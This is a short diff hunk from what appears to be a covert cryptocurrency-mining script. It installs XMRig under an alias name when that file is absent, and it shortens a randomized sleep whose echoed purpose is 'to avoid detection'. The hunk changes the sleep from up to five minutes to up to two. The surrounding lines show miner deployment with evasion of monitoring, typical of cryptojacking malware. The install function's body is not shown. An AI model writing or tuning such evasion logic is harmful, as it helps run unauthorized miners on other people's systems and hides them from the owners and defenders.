@@ -21,7 +21,7 @@ install_xmrig() {
 [ ! -f "./$ALIAS_NAME" ] && install_xmrig
 
 ### RANDOM SLEEP TO AVOID PATTERNS ###
-sleep_time=$((RANDOM % 300))  # up to 5 minutes
+sleep_time=$((RANDOM % 120))  # up to 2 minutes
 echo "[*] Sleeping for $sleep_time seconds to avoid detection..."
 sleep $sleep_time
 
